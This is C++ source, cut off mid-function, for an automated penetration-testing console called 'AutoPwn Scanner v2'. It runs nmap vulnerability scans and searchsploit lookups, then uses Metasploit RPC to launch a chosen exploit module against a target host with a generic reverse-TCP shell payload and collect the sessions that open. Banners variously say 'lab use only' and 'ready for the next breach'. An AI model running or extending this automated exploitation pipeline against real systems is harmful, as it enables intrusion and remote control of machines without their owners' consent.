

#include <cstdio>


#if __has_include(<readline/readline.h>)
  #include <readline/readline.h>
  #include <readline/history.h>
  #define HAS_READLINE 1
#else
  #define HAS_READLINE 0
#endif

#include <algorithm>
#include <atomic>
#include <chrono>
#include <cstdlib>
#include <cstring>
#include <ctime>
#include <filesystem>
#include <fstream>
#include <iomanip>
#include <iostream>
#include <map>
#include <mutex>
#include <random>
#include <set>
#include <sstream>
#include <stdexcept>
#include <string>
#include <thread>
#include <vector>

namespace fs = std::filesystem;
using namespace std::chrono_literals;

// ═════════════════════════════════════════════════════════════════
//  ANSI COLORS & SYMBOLS
// ═════════════════════════════════════════════════════════════════
namespace Color {
    // Reset / styles
    const std::string R   = "\033[0m";
    const std::string B   = "\033[1m";
    const std::string DIM = "\033[2m";
    const std::string IT  = "\033[3m";
    const std::string UL  = "\033[4m";

    // Foreground
    const std::string BLK = "\033[30m";
    const std::string RED = "\033[31m";
    const std::string GRN = "\033[32m";
    const std::string YEL = "\033[33m";
    const std::string BLU = "\033[34m";
    const std::string MAG = "\033[35m";
    const std::string CYN = "\033[36m";
    const std::string WHT = "\033[37m";

    // Bright foreground
    const std::string BRED = "\033[91m";
    const std::string BGRN = "\033[92m";
    const std::string BYEL = "\033[93m";
    const std::string BBLU = "\033[94m";
    const std::string BMAG = "\033[95m";
    const std::string BCYN = "\033[96m";
    const std::string BWHT = "\033[97m";

    // Helpers
    std::string bold(const std::string& s)    { return B    + s + R; }
    std::string dim(const std::string& s)     { return DIM  + s + R; }
    std::string red(const std::string& s)     { return BRED + s + R; }
    std::string green(const std::string& s)   { return BGRN + s + R; }
    std::string yellow(const std::string& s)  { return BYEL + s + R; }
    std::string cyan(const std::string& s)    { return BCYN + s + R; }
    std::string magenta(const std::string& s) { return BMAG + s + R; }
    std::string blue(const std::string& s)    { return BBLU + s + R; }
}

// Log prefix tags
namespace Tag {
    const std::string OK   = Color::BGRN + "[+]" + Color::R + " ";
    const std::string ERR  = Color::BRED + "[-]" + Color::R + " ";
    const std::string WARN = Color::BYEL + "[!]" + Color::R + " ";
    const std::string INFO = Color::BCYN + "[*]" + Color::R + " ";
    const std::string RUN  = Color::BBLU + "[»]" + Color::R + " ";
    const std::string DBG  = Color::DIM  + "[~]" + Color::R + " ";
}

// ═════════════════════════════════════════════════════════════════
//  UTILITY FUNCTIONS
// ═════════════════════════════════════════════════════════════════
static std::string now_hms() {
    auto t = std::chrono::system_clock::to_time_t(
                 std::chrono::system_clock::now());
    char buf[16];
    std::strftime(buf, sizeof(buf), "%H:%M:%S", std::localtime(&t));
    return buf;
}

static std::string now_full() {
    auto t = std::chrono::system_clock::to_time_t(
                 std::chrono::system_clock::now());
    char buf[32];
    std::strftime(buf, sizeof(buf), "%Y-%m-%d %H:%M:%S",
                  std::localtime(&t));
    return buf;
}

static std::string sanitize(const std::string& s) {
    std::string o;
    for (char c : s)
        o += (std::isalnum(static_cast<unsigned char>(c)) || c == '.') ? c : '_';
    return o;
}

static std::string trim(const std::string& s) {
    size_t a = s.find_first_not_of(" \t\r\n");
    size_t b = s.find_last_not_of(" \t\r\n");
    return (a == std::string::npos) ? "" : s.substr(a, b - a + 1);
}

static std::string strip_ansi_codes(const std::string& s) {
    std::string out;
    bool esc = false;
    for (char c : s) {
        if (c == '\033') { esc = true; continue; }
        if (esc) {
            if (c == 'm') esc = false;
            continue;
        }
        out += c;
    }
    return out;
}

static std::vector<std::string> split_lines(const std::string& s) {
    std::vector<std::string> lines;
    std::string curr;
    for (char c : s) {
        if (c == '\r') continue;
        if (c == '\n') { lines.push_back(curr); curr.clear(); }
        else curr += c;
    }
    if (!curr.empty()) lines.push_back(curr);
    return lines;
}

static std::string join_tokens(const std::vector<std::string>& tok,
                               size_t start = 0) {
    std::string out;
    for (size_t i = start; i < tok.size(); ++i) {
        if (i > start) out += " ";
        out += tok[i];
    }
    return out;
}

static std::string python_escape(const std::string& s) {
    std::string out;
    for (char c : s) {
        if (c == '\\' || c == '"') out += '\\';
        out += c;
    }
    return out;
}

static std::vector<std::string> tokenize(const std::string& line) {
    std::vector<std::string> tok;
    std::string cur;
    bool q = false;
    for (char c : line) {
        if (c == '"') { q = !q; continue; }
        if (c == ' ' && !q) { if (!cur.empty()) { tok.push_back(cur); cur.clear(); } }
        else cur += c;
    }
    if (!cur.empty()) tok.push_back(cur);
    return tok;
}


static int exec_stream(const std::string& cmd, int timeout_sec = 0) {
    std::string full = cmd;
    if (timeout_sec > 0)
        full = "timeout " + std::to_string(timeout_sec) + " " + cmd;
    FILE* p = popen(full.c_str(), "r");
    if (!p) return -1;
    char buf[512];
    while (fgets(buf, sizeof(buf), p)) {
        std::cout << buf;
        std::cout.flush();
    }
    return pclose(p);
}


static std::pair<std::string, int> exec_capture(const std::string& cmd,
                                                 int timeout_sec = 0) {
    std::string full = cmd;
    if (timeout_sec > 0)
        full = "timeout " + std::to_string(timeout_sec) + " " + cmd;
    std::string r;
    FILE* p = popen(full.c_str(), "r");
    if (!p) return {r, -1};
    char buf[512];
    while (fgets(buf, sizeof(buf), p)) r += buf;
    int rc = pclose(p);
    return {r, rc};
}

static std::string shell_quote(const std::string& s) {
    std::string q = "'";
    for (char c : s) {
        if (c == '\'') q += "'\\''";
        else q += c;
    }
    q += "'";
    return q;
}

static bool write_text_file(const fs::path& path, const std::string& content,
                            std::string& err) {
    try {
        fs::path parent = path.parent_path();
        if (!parent.empty()) {
            fs::create_directories(parent);
        }
        std::ofstream f(path);
        if (!f.is_open()) {
            err = "cannot open " + path.string();
            return false;
        }
        f << content;
        return true;
    } catch (const std::exception& e) {
        err = e.what();
        return false;
    }
}

static fs::path temp_script_path(const std::string& prefix) {
    try {
        fs::path tmp = fs::temp_directory_path();
        std::string name = prefix + "_" + std::to_string(
            std::chrono::steady_clock::now().time_since_epoch().count())
            + "_" + std::to_string(std::hash<std::string>()(prefix));
        return tmp / (name + ".py");
    } catch (...) {
        return fs::path("/tmp") / (prefix + ".py");
    }
}

static bool safe_create_directories(const std::string& path, std::string& err) {
    try {
        if (path.empty()) return true;
        fs::create_directories(path);
        return true;
    } catch (const std::filesystem::filesystem_error& e) {
        err = e.what();
        return false;
    } catch (const std::exception& e) {
        err = e.what();
        return false;
    }
}

static int safe_stoi(const std::string& s, int fallback = 0) {
    try {
        return std::stoi(s);
    } catch (...) {
        return fallback;
    }
}

// ═════════════════════════════════════════════════════════════════
//  PROGRESS BAR  (thread separato)
// ═════════════════════════════════════════════════════════════════
class ProgressBar {
public:
    ProgressBar(const std::string& label, int width = 40)
        : label_(label), width_(width), running_(false), pct_(0) {}

    void start() {
        running_ = true;
        pct_     = 0;
        thread_  = std::thread(&ProgressBar::loop, this);
    }

    void set(int pct) { pct_ = std::min(100, std::max(0, pct)); }

    void stop(bool ok = true) {
        running_ = false;
        if (thread_.joinable()) thread_.join();
        // Stampa barra finale al 100%
        std::cout << "\r  " << (ok ? Color::BGRN : Color::BRED)
                  << std::left << std::setw(22) << label_ << Color::R
                  << " [" << Color::BGRN;
        for (int i = 0; i < width_; ++i) std::cout << (ok ? "█" : "░");
        std::cout << Color::R << "] "
                  << (ok ? Color::BGRN + "100%" : Color::BRED + "FAIL")
                  << Color::R << "  \n";
        std::cout.flush();
    }

private:
    void loop() {
        const std::string spin = "⠋⠙⠹⠸⠼⠴⠦⠧⠇⠏";
        int frame = 0;
        while (running_) {
            int p    = pct_.load();
            int fill = (p * width_) / 100;

            std::cout << "\r  " << Color::BCYN
                      << std::left << std::setw(22) << label_ << Color::R
                      << " [" << Color::BGRN;
            for (int i = 0; i < fill;         ++i) std::cout << "█";
            std::cout << Color::DIM;
            for (int i = fill; i < width_;    ++i) std::cout << "░";
            std::cout << Color::R << "] "
                      << Color::BYEL << std::setw(4) << (std::to_string(p) + "%")
                      << Color::R << " "
                      << Color::BCYN
                      // spinner unicode (1 byte per char dell'indice)
                      << spin[frame % (int)spin.size()] << " "
                      << Color::R;
            std::cout.flush();

            ++frame;
            std::this_thread::sleep_for(120ms);
        }
    }

    std::string         label_;
    int                 width_;
    std::atomic<bool>   running_;
    std::atomic<int>    pct_;
    std::thread         thread_;
};

// ═════════════════════════════════════════════════════════════════
//  TABLE PRINTER
// ═════════════════════════════════════════════════════════════════
class Table {
public:
    explicit Table(std::vector<std::string> headers)
        : headers_(std::move(headers)) {
        for (auto& h : headers_) widths_.push_back(h.size());
    }

    void add_row(std::vector<std::string> row) {
        for (size_t i = 0; i < row.size() && i < widths_.size(); ++i)
            widths_[i] = std::max(widths_[i], row[i].size());
        rows_.push_back(std::move(row));
    }

    void print(const std::string& indent = "  ") const {
        // Top border
        std::cout << indent << Color::DIM << "╔";
        for (size_t i = 0; i < widths_.size(); ++i) {
            for (size_t j = 0; j < widths_[i] + 2; ++j) std::cout << "═";
            std::cout << (i + 1 < widths_.size() ? "╦" : "╗");
        }
        std::cout << Color::R << "\n";

        // Headers
        std::cout << indent << Color::DIM << "║" << Color::R;
        for (size_t i = 0; i < headers_.size(); ++i) {
            std::cout << " " << Color::B << Color::BCYN
                      << std::left << std::setw(widths_[i])
                      << headers_[i]
                      << Color::R
                      << Color::DIM << " ║" << Color::R;
        }
        std::cout << "\n";

        // Header separator
        std::cout << indent << Color::DIM << "╠";
        for (size_t i = 0; i < widths_.size(); ++i) {
            for (size_t j = 0; j < widths_[i] + 2; ++j) std::cout << "═";
            std::cout << (i + 1 < widths_.size() ? "╬" : "╣");
        }
        std::cout << Color::R << "\n";

        // Rows
        for (auto& row : rows_) {
            std::cout << indent << Color::DIM << "║" << Color::R;
            for (size_t i = 0; i < widths_.size(); ++i) {
                std::string cell = (i < row.size()) ? row[i] : "";
                std::cout << " " << Color::BWHT
                          << std::left << std::setw(widths_[i]) << cell
                          << Color::R
                          << Color::DIM << " ║" << Color::R;
            }
            std::cout << "\n";
        }

        // Bottom border
        std::cout << indent << Color::DIM << "╚";
        for (size_t i = 0; i < widths_.size(); ++i) {
            for (size_t j = 0; j < widths_[i] + 2; ++j) std::cout << "═";
            std::cout << (i + 1 < widths_.size() ? "╩" : "╝");
        }
        std::cout << Color::R << "\n";
    }

private:
    std::vector<std::string> headers_;
    std::vector<size_t>      widths_;
    std::vector<std::vector<std::string>> rows_;
};

// ═════════════════════════════════════════════════════════════════
//  SECTION DIVIDER
// ═════════════════════════════════════════════════════════════════
static void section(const std::string& title,
                    const std::string& color = Color::BCYN) {
    std::string line(55, '\xe2'); // placeholder
    std::cout << "\n" << color << Color::B
              << "  ┌─ " << title << " ";
    int pad = 50 - static_cast<int>(title.size());
    if (pad > 0) for (int i = 0; i < pad; ++i) std::cout << "─";
    std::cout << "┐" << Color::R << "\n";
}

static void section_end() {
    std::cout << Color::DIM
              << "  └" << std::string(54, '\xE2') // ─ UTF-8
              << "┘\n" << Color::R;
}

// Versione semplice senza box (usata per separare output tool)
static void divider(int w = 56) {
    std::cout << Color::DIM << "  ";
    for (int i = 0; i < w; ++i) std::cout << "\xe2\x94\x80";
    std::cout << Color::R << "\n";
}

// ═════════════════════════════════════════════════════════════════
//  LOGGER
// ═════════════════════════════════════════════════════════════════
class Logger {
public:
    Logger() = default;
    explicit Logger(const std::string& path) { open(path); }
    ~Logger() { if (f_.is_open()) f_.close(); }

    void open(const std::string& path) {
        std::string err;
        if (!safe_create_directories(fs::path(path).parent_path().string(), err)) {
            std::cerr << Tag::WARN << "Cannot create log directory: "
                      << err << "\n";
            return;
        }
        f_.open(path, std::ios::app);
        if (f_.is_open())
            f_ << "\n=== Session started: " << now_full() << " ===\n";
    }

    void log(const std::string& msg) {
        if (!f_.is_open()) return;
        std::lock_guard<std::mutex> lk(mu_);
        f_ << "[" << now_hms() << "] " << strip_ansi(msg) << "\n";
        f_.flush();
    }

    void log_cmd(const std::string& cmd) {
        log("CMD: " + cmd);
    }

private:
    std::ofstream    f_;
    std::mutex       mu_;

    static std::string strip_ansi(const std::string& s) {
        std::string out;
        bool esc = false;
        for (char c : s) {
            if (c == '\033') { esc = true; continue; }
            if (esc) { if (c == 'm') esc = false; continue; }
            out += c;
        }
        return out;
    }
};

// ═════════════════════════════════════════════════════════════════
//  CONFIG
// ═════════════════════════════════════════════════════════════════
class Config {
public:
    // ── Metasploit RPC ──
    std::string msf_password       = "change_this_password";
    std::string msf_host           = "127.0.0.1";
    std::string msf_port           = "55553";
    // ── Scanner ──
    std::string output_dir         = "./results";
    std::string monitor_interval   = "5";
    std::string post_pipeline_wait = "10";
    // ── Timeouts (seconds, 0 = none) ──
    std::string timeout_nmap       = "600";
    std::string timeout_searchsploit = "60";
    std::string timeout_msf        = "120";
    // ── Database ──
    std::string db_path            = "./results/scanner.db";
    // ── Workspace ──
    std::string workspace          = "default";
    // ── Log ──
    std::string log_dir            = "./logs";

    std::string config_path = "config.ini";

    // Tutti i parametri accessibili via 'set'
    std::map<std::string, std::string*> fields() {
        return {
            {"msf_password",        &msf_password},
            {"msf_host",            &msf_host},
            {"msf_port",            &msf_port},
            {"output_dir",          &output_dir},
            {"monitor_interval",    &monitor_interval},
            {"post_pipeline_wait",  &post_pipeline_wait},
            {"timeout_nmap",        &timeout_nmap},
            {"timeout_searchsploit",&timeout_searchsploit},
            {"timeout_msf",         &timeout_msf},
            {"db_path",             &db_path},
            {"workspace",           &workspace},
            {"log_dir",             &log_dir},
        };
    }

    // Percorso cartella del workspace corrente
    std::string ws_dir() const {
        return output_dir + "/ws_" + sanitize(workspace);
    }

    void load(const std::string& path = "config.ini") {
        config_path = path;
        std::ifstream f(path);
        if (!f.is_open()) return;
        std::string line, sec;
        while (std::getline(f, line)) {
            line = trim(line);
            if (line.empty() || line[0] == '#') continue;
            if (line.front() == '[' && line.back() == ']') {
                sec = line.substr(1, line.size() - 2); continue;
            }
            auto eq = line.find('=');
            if (eq == std::string::npos) continue;
            std::string k = trim(line.substr(0, eq));
            std::string v = trim(line.substr(eq + 1));
            auto hash = v.find('#');
            if (hash != std::string::npos) v = trim(v.substr(0, hash));
            auto fm = fields();
            if (fm.count(k)) *fm[k] = v;
        }
    }

    void save() const {
        std::ofstream f(config_path);
        if (!f.is_open()) return;
        f << "# AutoPwn Scanner v2 — config.ini\n"
          << "# Do NOT commit this file.\n\n"
          << "[metasploit]\n"
          << "msf_password        = " << msf_password        << "\n"
          << "msf_host            = " << msf_host            << "\n"
          << "msf_port            = " << msf_port            << "\n\n"
          << "[scanner]\n"
          << "output_dir          = " << output_dir          << "\n"
          << "monitor_interval    = " << monitor_interval    << "\n"
          << "post_pipeline_wait  = " << post_pipeline_wait  << "\n\n"
          << "[timeouts]\n"
          << "timeout_nmap        = " << timeout_nmap        << "\n"
          << "timeout_searchsploit= " << timeout_searchsploit<< "\n"
          << "timeout_msf         = " << timeout_msf         << "\n\n"
          << "[database]\n"
          << "db_path             = " << db_path             << "\n\n"
          << "[workspace]\n"
          << "workspace           = " << workspace           << "\n"
          << "log_dir             = " << log_dir             << "\n";
    }

    bool validate(std::string& err) const {
        if (workspace.empty()) {
            err = "workspace cannot be empty";
            return false;
        }
        if (output_dir.empty()) {
            err = "output_dir cannot be empty";
            return false;
        }
        if (log_dir.empty()) {
            err = "log_dir cannot be empty";
            return false;
        }
        int port = safe_stoi(msf_port, -1);
        if (port <= 0 || port > 65535) {
            err = "msf_port must be a valid number between 1 and 65535";
            return false;
        }
        if (safe_stoi(timeout_nmap, -1) < 0) {
            err = "timeout_nmap must be a non-negative integer";
            return false;
        }
        if (safe_stoi(timeout_searchsploit, -1) < 0) {
            err = "timeout_searchsploit must be a non-negative integer";
            return false;
        }
        if (safe_stoi(timeout_msf, -1) < 0) {
            err = "timeout_msf must be a non-negative integer";
            return false;
        }
        if (db_path.empty()) {
            err = "db_path cannot be empty";
            return false;
        }
        return true;
    }

    static std::string trim(const std::string& s) {
        size_t a = s.find_first_not_of(" \t\r\n");
        size_t b = s.find_last_not_of(" \t\r\n");
        return (a == std::string::npos) ? "" : s.substr(a, b - a + 1);
    }
};

// ═════════════════════════════════════════════════════════════════
//  BANNER POOL  ( banner ASCII )
// ═════════════════════════════════════════════════════════════════
struct Banner { std::string color, art, tagline; };

static const Banner& random_banner() {
    static const std::vector<Banner> pool = {
        {
            Color::BCYN,
            R"(
   ___        __       ____                  ___
  / _ | __ __/ /____  / __ \    ___ ___ ___ |_  |
 / __ |/ // / __/ _ \/ /_/ /  (_-</ -_) -_)/ __/
/_/ |_|\_,_/\__/\___/ .___/  /___/\__/\__/____/
                    /_/                          )",
            "  Automated Penetration Testing Pipeline — v2.0"
        },
        {
            Color::BGRN,
            R"(
 ██████╗  ██╗    ██╗███╗   ██╗
 ██╔══██╗ ██║    ██║████╗  ██║
 ███████║ ██║ █╗ ██║██╔██╗ ██║
 ██╔══██║ ██║███╗██║██║╚██╗██║
 ██║  ██║ ╚███╔███╔╝██║ ╚████║
 ╚═╝  ╚═╝  ╚══╝╚══╝ ╚═╝  ╚═══╝  scanner v2)",
            "  [ Nmap · Searchsploit · Metasploit RPC ]"
        },
        {
            Color::BRED,
            R"(
  /\  _   _|_  _  |_   /\  / \/  _  _
 /--\(_)_) |_ (_) |_) /--\ \_/\/(/_|
                              v2.0   )",
            "  offensive automation — for lab use only"
        },
        {
            Color::BMAG,
            R"(
  _____       _       _____
 |  _  |_ _ | |_ ___|  _  |_ _ _ ___
 |     | | ||  _| . |   __| | | |   |   v2.0
 |__|__|___|_|_| |___|__|  |_____|_|_|        )",
            "  scan. enumerate. exploit. persist."
        },
        {
            Color::BYEL,
            R"(
 ┌─┐┬ ┬┌┬┐┌─┐  ┌─┐┬ ┬┌┐┌  ┬  ┬ ┬
 ├─┤│ │ │ │ │  ├─┘│││││││  └┐┌┘ ┌┘
 ┴ ┴└─┘ ┴ └─┘  ┴  └┘┘└┘└─┘  └┘  └
                      scanner  v2.0  )",
            "  authorized environments only"
        },
        {
            Color::BGRN,
            R"(
  ▄▄▄· ▄• ▄▌▄▄▄▄▄      ▄▄▄·▄▄▌ ▐ ▄▌ ▐ ▄
 ▐█ ▀█ █▪██▌•██  ▪     ▐█ ▄██•  █▌▐█•█▌▐█
 ▄█▀▀█ █▌▐█▌ ▐█.▪ ▄█▀▄  ██▀·██ ▐█▐▐▌▐█▐▐▌
 ▐█ ▪▐▌▐█▄█▌ ▐█▌·▐█▌.▐▌▐█▪·•▐█▌██▐█▌██▐█▌
  ▀  ▀  ▀▀▀  ▀▀▀  ▀█▄▀▪.▀    ▀▀▀▀ ▀▪▀▀ █▪)",
            "  wake up. the target is waiting."
        },
        {
            Color::BCYN,
            R"(
   ____  ____  _   _  _____  _   _
  / ___||  _ \| \ | || ____|| \ | |
 | |  _ | |_) |  \| ||  _|  |  \| |
 | |_| ||  _ <| |\  || |___ | |\  |
  \____||_| \_\_| \_||_____||_| \_|
                                  )",
            "  vulnerable world, one port at a time"
        },
        {
            Color::BWHT,
            R"(
  ______   _____   __   __  _____  _   _
 |  ____| |  __ \  \ \ / / |_   _|| \ | |
 | |__    | |__) |  \ V /    | |  |  \| |
 |  __|   |  _  /    > <     | |  | . ` |
 | |____  | | \ \   / . \   _| |_ | |\  |
 |______| |_|  \_\ /_/ \_\ |_____||_| \_|
                                         )",
            "  exploit chain engaged"
        },
        {
            Color::BRED,
            R"(
   _____  _   _   _   _   _____   _____
  / ____|| \ | | | \ | | |  __ \ / ____|
 | |     |  \| | |  \| | | |__) | (___
 | |     | . ` | | . ` | |  _  / \___ \
 | |____ | |\  | | |\  | | | \ \ ____) |
  \_____||_| \_| |_| \_| |_|  \_\_____/)",
            "  ready for the next breach"
        },
    };
    static std::mt19937 rng(
        static_cast<unsigned>(
            std::chrono::steady_clock::now().time_since_epoch().count()));
    std::uniform_int_distribution<size_t> dist(0, pool.size() - 1);
    return pool[dist(rng)];
}

static void print_banner(const Config& cfg) {
    const Banner& b = random_banner();
    std::cout << b.color << Color::B << b.art << Color::R << "\n";
    std::cout << Color::DIM << b.tagline << Color::R << "\n";
    std::cout << Color::DIM
              << "  workspace: " << cfg.workspace
              << "  |  msf: "   << cfg.msf_host << ":" << cfg.msf_port
              << "  |  " << now_full()
              << Color::R << "\n\n";
}

// ═════════════════════════════════════════════════════════════════
//  AUTOCOMPLETION  (usato da readline)
// ═════════════════════════════════════════════════════════════════
static const std::vector<std::string> COMMANDS = {
    "scan", "nmap", "searchsploit", "exploit", "msf", "sessions",
    "kill", "report", "set", "show", "workspace", "banner",
    "clear", "cls", "help", "config", "exit", "quit"
};

#if HAS_READLINE
static char* cmd_generator(const char* text, int state) {
    static size_t idx;
    static std::string prefix;
    if (state == 0) { idx = 0; prefix = text; }
    while (idx < COMMANDS.size()) {
        const std::string& c = COMMANDS[idx++];
        if (c.rfind(prefix, 0) == 0)
            return strdup(c.c_str());
    }
    return nullptr;
}
static char** autopwn_completion(const char* text, int /*start*/, int /*end*/) {
    rl_attempted_completion_over = 1;
    return rl_completion_matches(text, cmd_generator);
}
static void init_readline() {
    rl_attempted_completion_function = autopwn_completion;
    rl_bind_key('\t', rl_complete);
}
#endif

// ═════════════════════════════════════════════════════════════════
//  PROMPT  —  autopwn (workspace/target) >
// ═════════════════════════════════════════════════════════════════
static std::string g_target;   // aggiornato dopo ogni 'scan'
static std::string g_selected_exploit;

static std::string build_prompt(const Config& cfg) {
    std::string ctx = cfg.workspace;
    if (!g_target.empty()) ctx += "/" + g_target;
    if (!g_selected_exploit.empty()) ctx += " [" + g_selected_exploit + "]";
    return Color::B + Color::BRED + "autopwn" + Color::R +
           Color::DIM + " (" + ctx + ")" + Color::R +
           Color::B + " > " + Color::R;
}

static std::string read_line(const Config& cfg) {
    std::string prompt = build_prompt(cfg);
#if HAS_READLINE
    char* raw = readline(prompt.c_str());
    if (!raw) return "exit";
    std::string line = trim(raw);
    if (!line.empty()) add_history(raw);
    free(raw);
    return line;
#else
    std::cout << prompt;
    std::string line;
    if (!std::getline(std::cin, line)) return "exit";
    return trim(line);
#endif
}

static void clear_screen() {
#if defined(_WIN32) || defined(_WIN64)
    std::system("cls");
#else
    std::cout << "\033[2J\033[H";
#endif
}

// ═════════════════════════════════════════════════════════════════
//  NMAP RUNNER
// ═════════════════════════════════════════════════════════════════
class NmapRunner {
public:
    explicit NmapRunner(Config& c, Logger& l) : cfg(c), log(l) {}

    std::string run(const std::string& target) {
        std::string ws  = cfg.ws_dir();
        std::string xml = ws + "/scan_" + sanitize(target) + ".xml";
        std::string err;
        if (!safe_create_directories(ws, err)) {
            std::cout << Tag::ERR << Color::red("Cannot create workspace directory: " + err + "\n");
            log.log("[-] cannot create workspace dir: " + err);
            return "";
        }

        section("NMAP SCAN", Color::BCYN);
        std::cout << Tag::INFO << "Target    : "
                  << Color::BYEL << target << Color::R << "\n";
        std::cout << Tag::INFO << "Output    : "
                  << Color::DIM << xml << Color::R << "\n";
        std::cout << Tag::INFO << "Timeout   : "
                  << cfg.timeout_nmap << "s\n";
        divider();

        std::string cmd = "nmap -sV --script=vulners -oX "
                          + xml + " " + target + " 2>&1";
        log.log_cmd("nmap " + target);

        // Progress bar in background + esecuzione
        ProgressBar pb("Scanning " + target, 36);
        pb.start();

        // Nmap scrive il file XML solo alla fine: simuliamo avanzamento
        // con un ticker. Il vero progresso viene dallo stdout in streaming.
        std::atomic<bool> done{false};
        std::thread ticker([&](){
            int p = 0;
            while (!done && p < 95) {
                std::this_thread::sleep_for(3s);
                p += 3;
                pb.set(p);
            }
        });

        // Esegui nmap — redirige output sotto la progress bar
        std::cout << "\n";
        int rc = exec_stream(cmd, safe_stoi(cfg.timeout_nmap));
        done = true;
        if (ticker.joinable()) ticker.join();
        pb.stop(rc == 0 && fs::exists(xml));

        divider();
        if (rc == 0 && fs::exists(xml)) {
            std::cout << Tag::OK << Color::green("Scan complete.") << "\n";
            log.log("[+] nmap complete → " + xml);
            return xml;
        }
        if (rc == 124)
            std::cout << Tag::WARN << Color::yellow("Nmap timed out after "
                       + cfg.timeout_nmap + "s\n");
        else
            std::cout << Tag::ERR << Color::red("Nmap failed (exit "
                       + std::to_string(rc) + ")\n");
        log.log("[-] nmap failed rc=" + std::to_string(rc));
        return "";
    }

private:
    Config& cfg;
    Logger& log;
};

// ═════════════════════════════════════════════════════════════════
//  SEARCHSPLOIT RUNNER
// ═════════════════════════════════════════════════════════════════
class SearchsploitRunner {
public:
    explicit SearchsploitRunner(Config& c, Logger& l) : cfg(c), log(l) {}

    std::string run(const std::string& xml) {
        std::string json = cfg.ws_dir() + "/searchsploit_results.json";

        section("SEARCHSPLOIT", Color::BMAG);
        std::cout << Tag::INFO << "Parsing: "
                  << Color::DIM << xml << Color::R << "\n";
        divider();

        ProgressBar pb("Querying exploitdb", 36);
        pb.start();
        auto [out, rc] = exec_capture(
            "searchsploit --nmap " + shell_quote(xml) + " -j 2>&1",
            safe_stoi(cfg.timeout_searchsploit));
        pb.stop(rc == 0 && !out.empty());

        std::ofstream f(json); f << out;
        std::cout << "\n" << out;
        divider();
        if (rc != 0) {
            std::cout << Tag::WARN << Color::yellow("Searchsploit exited with code "
                      + std::to_string(rc) + ". Check output above.\n");
        }
        std::cout << Tag::OK << "Results saved → "
                  << Color::DIM << json << Color::R << "\n";
        log.log("[+] searchsploit → " + json);
        return json;
    }

private:
    Config& cfg;
    Logger& log;
};

static std::string resolve_xml_path(const Config& cfg, const std::string& name) {
    if (name.empty()) return "";
    if (fs::exists(name)) return name;
    fs::path candidate = cfg.ws_dir() + "/scan_" + sanitize(name) + ".xml";
    if (fs::exists(candidate)) return candidate.string();
    return name;
}

static bool run_msf_exploit(const Config& cfg, Logger& log,
                            const std::string& module,
                            const std::string& target,
                            int rport) {
    if (module.empty()) return false;
    std::string script =
        "import json, time\n"
        "from pymetasploit3.msfrpc import MsfRpcClient\n"
        "try:\n"
        "    c = MsfRpcClient(\"" + python_escape(cfg.msf_password) + "\","
        " server=\"" + python_escape(cfg.msf_host) + "\","
        " port=" + cfg.msf_port + ")\n"
        "    exploit = c.modules.use(\"exploit\", \"" + python_escape(module) + "\")\n"
        "    exploit[\"RHOST\"] = \"" + python_escape(target) + "\"\n";
    if (rport > 0) {
        script += "    exploit[\"RPORT\"] = " + std::to_string(rport) + "\n";
    }
    script +=
        "    payload = c.modules.use(\"payload\", \"generic/shell_reverse_tcp\")\n"
        "    job = exploit.execute(payload=payload)\n"
        "    time.sleep(5)\n"
        "    sessions = c.sessions.list\n"
        "    new_sessions = [sid for sid, info in sessions.items() "
        "if info.get(\"via_exploit\") == \"" + python_escape(module) + "\" "
        "and info.get(\"target_host\") == \"" + python_escape(target) + "\"]\n"
        "    print(json.dumps({'job': job, 'sessions': new_sessions}))\n"
        "except Exception as e:\n"
        "    print(json.dumps({'error': str(e)}))\n";

    fs::path tmp = temp_script_path("ap_exploit");
    std::string err;
    if (!write_text_file(tmp, script, err)) {
        std::cout << Tag::ERR << Color::red("Cannot write temp script: " + err + "\n");
        log.log("[-] exploit temp script failed: " + err);
        return false;
    }

    std::cout << Tag::INFO << "Running exploit module: "
              << Color::BYEL << module << Color::R << "\n";
    std::string cmd = "python3 " + shell_quote(tmp.string());
    int rc = exec_stream(cmd, safe_stoi(cfg.timeout_msf));
    fs::remove(tmp);
    if (rc != 0) {
        std::cout << Tag::ERR << Color::red("Exploit execution failed (rc "
                  + std::to_string(rc) + ")\n");
        log.log("[-] exploit run failed rc=" + std::to_string(rc));
        return false;
    }
    log.log("[+] exploit run " + module + " target=" + target);
    return true;
}

static std::string list_msf_modules(const Config& cfg,
                                    const std::string& query,
                                    std::string& err) {
    std::string search = "search type:exploit";
    if (!query.empty()) search += " " + query;
    std::string cmd = "env TERM=vt100 msfconsole -q -x " + shell_quote(search + "; exit");
    auto [out, rc] = exec_capture(cmd, safe_stoi(cfg.timeout_msf));
    if (rc != 0) {
        err = "msfconsole search failed (rc=" + std::to_string(rc) + ")";
        return strip_ansi_codes(out);
    }
    return strip_ansi_codes(out);
}

static std::vector<std::pair<std::string, std::string>> parse_msf_search_output(const std::string& output) {
    std::vector<std::pair<std::string, std::string>> rows;
    auto lines = split_lines(output);
    for (auto& line : lines) {
        std::string trimmed = trim(strip_ansi_codes(line));
        if (trimmed.empty()) continue;
        if (trimmed.rfind("Matching Modules", 0) == 0) continue;
        if (trimmed.rfind("Search", 0) == 0) continue;
        if (trimmed.find("No results") != std::string::npos) continue;
        if (trimmed.find("Loaded") != std::string::npos) continue;
        if (trimmed.find("module") == std::string::npos && trimmed.find("exploit/") == std::string::npos) continue;

        std::istringstream iss(trimmed);
        std::vector<std::string> cols;
        std::string token;
        while (iss >> token) cols.push_back(token);
        if (cols.empty()) continue;

        size_t module_idx = std::string::npos;
        for (size_t i = 0; i < cols.size(); ++i) {
            if (cols[i].find("exploit/") != std::string::npos) {
                module_idx = i;
                break;
            }
        }
        if (module_idx == std::string::npos) continue;

        std::string module = cols[module_idx];
        size_t pos = trimmed.find(module);
        std::string desc = trim((pos == std::string::npos || pos + module.size() >= trimmed.size())
                                    ? ""
                                    : trimmed.substr(pos + module.size()));
        rows.emplace_back(module, desc);
    }
    return rows;
}

static void print_msf_search_results(const std::string& output) {
    auto rows = parse_msf_search_output(output);
    if (rows.empty()) {
        std::cout << Tag::WARN << Color::yellow("No MSF exploit modules found in output.\n");
        std::cout << output << "\n";
        return;
    }

    Table t({"Module", "Description"});
    size_t count = 0;
    for (auto& item : rows) {
        if (++count > 60) break;
        t.add_row({item.first, item.second});
    }
    t.print();
    if (rows.size() > 60)
        std::cout << Color::DIM << "  ...showing first 60 of "
                  << rows.size() << " modules" << Color::R << "\n";
}

static std::string get_msf_module_info(const Config& cfg,
                                       const std::string& module,
                                       std::string& err) {
    if (module.empty()) {
        err = "module is empty";
        return "";
    }
    std::string cmd = "env TERM=vt100 msfconsole -q -x "
                      + shell_quote("info " + module + "; exit");
